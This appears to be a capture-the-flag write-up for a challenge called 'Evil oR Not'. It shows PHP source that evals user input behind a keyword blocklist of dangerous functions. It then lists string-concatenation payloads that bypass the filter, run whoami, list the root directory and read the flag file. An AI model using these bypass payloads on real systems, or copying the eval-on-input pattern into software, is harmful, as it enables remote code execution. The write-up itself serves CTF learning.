# Evil oR Not
![](images/2023-02-22-22-34-00.png)

```php
<?php


error_reporting(0);

if (isset($_POST['submit']))
{
        
    $x = strtolower($_POST['txt']);
    $reg="/system|exec|eval|passthru|file|open|php|include|require|show|get_all_headers|curl\`/im";

    if(preg_match($reg,$x))
    {
        echo "Try harder";
    } 
    else 
    {
    
        eval($x);
    }
        
}
else
{
    show_source(__FILE__);
}
?>
```
```php
<!DOCTYPE html>
<html>
<head>
    <title>Get sad shell</title>
</head>
<body>
    <form action="" method="POST">
    <center>
    <p>Get sad shell</p>
    <input type="text" name="txt"><br />
    <input type="submit" name="submit">
    <br><br><br><br><br><br><br><br><br><br><br><br><br><br>
    </center>
    
    </form>
</body>
</html>
```
![](images/2023-02-22-22-36-05.png)

然而可以通过字符串拼接绕过等

[php绕过姿势-Rlins-博客园](https://www.cnblogs.com/Rlins/articles/16369740.html)

`(p.h.p.i.n.f.o)();`
![](images/2023-02-22-22-38-33.png)

`(sy.(st).em)(whoami);`
![](images/2023-02-22-22-39-17.png)

`(sy.(st).em)("cd /;ls");`
![](images/2023-02-22-22-40-18.png)

`(sy.(st).em)("cd /;cat flag*");`
![](images/2023-02-22-22-40-56.png)
**0xL4ugh{Ev!l_!5_Alw@ys_Evill}**